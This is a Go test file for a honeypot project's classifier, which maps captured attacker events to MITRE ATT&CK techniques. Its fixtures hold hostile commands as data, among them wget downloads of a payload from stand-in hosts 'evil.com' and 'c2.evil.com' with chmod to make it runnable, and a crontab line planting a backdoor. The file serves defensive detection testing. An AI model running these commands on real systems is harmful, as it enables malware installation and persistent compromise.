package intelligence

import (
	"context"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// ---- helpers ----

func makeEvent(honeypot, eventType, command, username string) *database.Event {
	return &database.Event{
		Timestamp: time.Now().UTC(),
		Honeypot:  honeypot,
		EventType: eventType,
		Command:   command,
		Username:  username,
		SourceIP:  "1.2.3.4",
	}
}

// newTestClassifierT creates a classifier whose ATT&CK loader uses t.TempDir().
func newTestClassifierT(t *testing.T) *Classifier {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	ttpBuilder := NewTTPBuilder(30 * time.Minute)
	return NewClassifier(loader, ttpBuilder)
}

// ---- rule compilation ----

func TestDefaultRulesCompile(t *testing.T) {
	rules := DefaultRules()
	if len(rules) == 0 {
		t.Fatal("DefaultRules returned empty slice")
	}
	compiled := compileRules(rules)
	if len(compiled) != len(rules) {
		t.Errorf("compileRules dropped rules: got %d, want %d", len(compiled), len(rules))
	}
}

func TestDefaultRulesSortedByPriority(t *testing.T) {
	rules := DefaultRules()
	for i := 1; i < len(rules); i++ {
		if rules[i].Priority > rules[i-1].Priority {
			t.Errorf("rules not sorted at index %d: priority %d > %d",
				i, rules[i].Priority, rules[i-1].Priority)
		}
	}
}

func TestAllStaticRulesHaveConfidence(t *testing.T) {
	for _, r := range DefaultRules() {
		if r.Confidence == 0 {
			t.Errorf("rule %q has zero confidence", r.TechniqueID)
		}
	}
}

// ---- classification ----

func TestClassifyBruteForceSSH(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "login_failed", "", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1110" {
		t.Errorf("expected T1110, got %q", ev.TechniqueID)
	}
	if ev.KillChainStage != "initial-access" {
		t.Errorf("expected initial-access kill chain, got %q", ev.KillChainStage)
	}
	if !ev.Classified {
		t.Error("event should be marked classified")
	}
}

func TestClassifyIngressToolTransfer(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "wget http://evil.com/malware.sh -O /tmp/x && chmod +x /tmp/x", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1105" {
		t.Errorf("expected T1105, got %q", ev.TechniqueID)
	}
}

func TestClassifyPrivilegeEscalation(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "sudo su root", "attacker")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1548" {
		t.Errorf("expected T1548, got %q", ev.TechniqueID)
	}
}

func TestClassifyPersistence(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "crontab -e && echo '* * * * * /tmp/backdoor'", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1053" {
		t.Errorf("expected T1053, got %q", ev.TechniqueID)
	}
}

func TestClassifySystemInfoDiscovery(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "uname -a", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1082" {
		t.Errorf("expected T1082, got %q", ev.TechniqueID)
	}
}

func TestClassifyICSCommand(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("conpot", "command", "WRITE_COIL 1 1", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T0855" {
		t.Errorf("expected T0855 (ICS Unauthorized Command), got %q", ev.TechniqueID)
	}
}

func TestClassifyDoesNotMatchWrongHoneypot(t *testing.T) {
	c := newTestClassifierT(t)
	// T0855 only applies to conpot; a cowrie command event should not match it.
	ev := makeEvent("cowrie", "command", "WRITE_COIL 1 1", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID == "T0855" {
		t.Error("T0855 should not match cowrie honeypot")
	}
}

func TestClassifyNetworkServiceDiscovery(t *testing.T) {
	c := newTestClassifierT(t)
	// connection event with no username → T1046
	ev := makeEvent("cowrie", "connection", "", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1046" {
		t.Errorf("expected T1046, got %q", ev.TechniqueID)
	}
}

func TestClassifyUnclassifiedEventLeftUnchanged(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "some_unknown_event_type", "", "")
	c.Classify(context.Background(), ev)
	if ev.Classified {
		t.Error("event with no matching rule should not be classified")
	}
	if ev.TechniqueID != "" {
		t.Errorf("TechniqueID should be empty, got %q", ev.TechniqueID)
	}
}

func TestClassifyConfidenceDefault(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "login_failed", "", "admin")
	c.Classify(context.Background(), ev)
	if ev.Confidence == 0 {
		t.Error("classified event should have non-zero confidence")
	}
	if ev.Confidence > 1.0 {
		t.Errorf("confidence should be ≤ 1.0, got %f", ev.Confidence)
	}
}

// ---- MergeRules ----

func TestMergeRulesStaticWins(t *testing.T) {
	static := []Rule{{TechniqueID: "T1234", Priority: 100, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "foo"}}}}
	dynamic := []Rule{{TechniqueID: "T1234", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "bar"}}}}
	merged := MergeRules(static, dynamic)
	if len(merged) != 1 {
		t.Fatalf("expected 1 merged rule, got %d", len(merged))
	}
	if merged[0].Confidence != 1.0 {
		t.Errorf("static rule should win: expected confidence 1.0, got %f", merged[0].Confidence)
	}
}

func TestMergeRulesDynamicFillsGaps(t *testing.T) {
	static := []Rule{{TechniqueID: "T1234", Priority: 100, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "foo"}}}}
	dynamic := []Rule{
		{TechniqueID: "T1234", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "bar"}}},
		{TechniqueID: "T9999", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "baz"}}},
	}
	merged := MergeRules(static, dynamic)
	if len(merged) != 2 {
		t.Fatalf("expected 2 merged rules, got %d", len(merged))
	}
}

func TestMergeRulesSortedByPriority(t *testing.T) {
	static := []Rule{
		{TechniqueID: "T1", Priority: 10, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "a"}}},
		{TechniqueID: "T2", Priority: 50, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "b"}}},
	}
	merged := MergeRules(static, nil)
	if merged[0].Priority < merged[1].Priority {
		t.Error("merged rules should be sorted descending by priority")
	}
}

// ---- batch + stress ----

func TestClassifyBatch(t *testing.T) {
	c := newTestClassifierT(t)
	events := make([]*database.Event, 200)
	for i := range events {
		switch i % 4 {
		case 0:
			events[i] = makeEvent("cowrie", "login_failed", "", "root")
		case 1:
			events[i] = makeEvent("cowrie", "command", "wget http://c2.evil.com/payload", "root")
		case 2:
			events[i] = makeEvent("cowrie", "command", "uname -a", "root")
		case 3:
			events[i] = makeEvent("cowrie", "connection", "", "")
		}
	}
	iocs := c.ClassifyBatch(context.Background(), events)
	// All events should be classified.
	for i, ev := range events {
		if !ev.Classified {
			t.Errorf("event[%d] was not classified", i)
		}
	}
	if len(iocs) == 0 {
		t.Error("ClassifyBatch should have extracted IOCs from wget and login events")
	}
}

func TestClassifyConcurrent(t *testing.T) {
	c := newTestClassifierT(t)
	const goroutines = 20
	const eventsPerGoroutine = 50

	var wg sync.WaitGroup
	wg.Add(goroutines)
	for g := 0; g < goroutines; g++ {
		go func() {
			defer wg.Done()
			for i := 0; i < eventsPerGoroutine; i++ {
				ev := makeEvent("cowrie", "login_failed", "", "admin")
				c.Classify(context.Background(), ev)
				if !ev.Classified {
					t.Errorf("concurrent classify: event not classified")
				}
			}
		}()
	}
	wg.Wait()
}
